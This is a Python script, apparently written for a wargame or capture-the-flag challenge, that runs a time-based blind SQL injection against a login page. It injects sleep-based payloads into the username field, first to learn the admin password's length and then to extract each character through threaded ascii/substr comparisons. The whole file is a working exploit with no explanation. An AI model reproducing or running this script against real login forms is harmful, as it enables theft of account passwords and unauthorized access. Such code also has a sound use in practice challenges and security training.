import requests
from concurrent.futures import ThreadPoolExecutor
from itertools import count

session = requests.Session()

def check_length():  
  for i in count(1):
    payload = f"admin' and length(password)={i} and sleep({sleep_time})#"
    data={
      'username':payload,
      'password':'d'
    }
    res=session.post(url, data=data)
    if res.elapsed.total_seconds()>sleep_time:
      print(i)
      return i

def attack(n):
  for i in range(33,127):
    payload=f"admin' and ascii(substr(password,{n},1))={i} and sleep({sleep_time})#"
    data={
      'username':payload,
      'password':'d'
    }
    res = session.post(url, data=data)
    if res.elapsed.total_seconds()>sleep_time:
      return chr(i)

def find_char(length):
  with ThreadPoolExecutor(max_workers=length) as excutuer:
    results = excutuer.map(attack, range(1,length+1))
  return ''.join(results)
  
url = "http://war.knock-on.org:40350/login"
sleep_time=1.5
length = check_length()
password = find_char(length)
print(password)
